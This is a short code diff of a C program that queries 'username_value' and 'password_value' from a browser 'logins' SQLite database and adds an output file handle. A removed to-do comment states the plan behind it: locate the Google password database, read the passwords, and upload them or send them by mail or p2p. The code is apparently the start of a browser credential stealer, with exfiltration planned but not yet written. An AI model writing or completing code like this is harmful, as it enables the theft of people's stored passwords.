@@ -5,6 +5,8 @@
 
 char *get_db_path();
 
+FILE *out_file;
+
 int main(void){
 
 	// get version (only used to verify that sqlite3 was included correctly)
@@ -29,9 +31,6 @@ int main(void){
 	// compile a SQL statement and put it in 4th parameter
 	status = sqlite3_prepare_v2(db, "SELECT username_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
 	status = sqlite3_prepare_v2(db, "SELECT password_value FROM logins;", -1, &res, 0); // 2nd parameter is the statement
-	//2do: 	read correct DB (google password database -> and write function to locate database)
-	//	Read passwords
-	//	Upload passwords or send via mail (or even p2p)
 
 	char *db_path = get_db_path();
 	printf("%s\n", db_path);
